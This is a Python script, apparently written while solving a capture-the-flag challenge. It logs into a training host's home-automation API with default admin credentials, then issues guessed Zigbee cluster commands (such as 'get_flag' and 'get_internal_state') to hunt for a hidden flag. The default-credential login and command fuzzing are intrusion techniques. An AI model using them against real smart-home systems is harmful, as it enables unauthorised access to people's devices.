#!/usr/bin/env python3
import requests
import json
import base64

# Get token
token_resp = requests.post("http://training-pod2.ctfchile.com:32780/api/v2/auth/login",
                          json={"username":"admin","password":"admin1234"})
token = token_resp.json()["access_token"]

headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

print("[*] Exploring cluster 257 and looking for the internal flow...")

# First, let's see if cluster 257 is special by trying to read all its attributes
cluster_commands_to_try = [
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"read_attributes","attributes":[0,1,2,3,4,5,6,7,8,9,10]},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"discover_attributes"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"discover_commands_received"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"discover_commands_generated"},

    # Try various flag-related commands
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"flag"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"get_coordinator_flag"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"read_flag"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"extract_flag"},

    # Try accessing internal coordination protocols
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"get_internal_state"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"coordinator_status"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"mesh_status"},
]

for i, cmd in enumerate(cluster_commands_to_try):
    print(f"\n[*] Testing command {i+1}: {cmd['command']}")
    try:
        resp = requests.post(
            "http://training-pod2.ctfchile.com:32780/api/v2/services/zha/issue_zigbee_cluster_command",
            headers=headers, json=cmd
        )
        result = resp.json()
        print(f"    Response: {result}")
    except Exception as e:
        print(f"    Error: {e}")

# Also try different cluster IDs that might be related
print("\n[*] Testing other potential clusters...")
special_clusters = [0, 1, 6, 8, 256, 258, 259, 512, 1024, 0xFFFE]

for cluster_id in special_clusters:
    try:
        cmd = {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":cluster_id,"command":"get_flag"}
        resp = requests.post(
            "http://training-pod2.ctfchile.com:32780/api/v2/services/zha/issue_zigbee_cluster_command",
            headers=headers, json=cmd
        )
        result = resp.json()
        print(f"    Cluster {cluster_id}: {result}")
    except:
        pass

print("\n[*] Cluster exploration complete")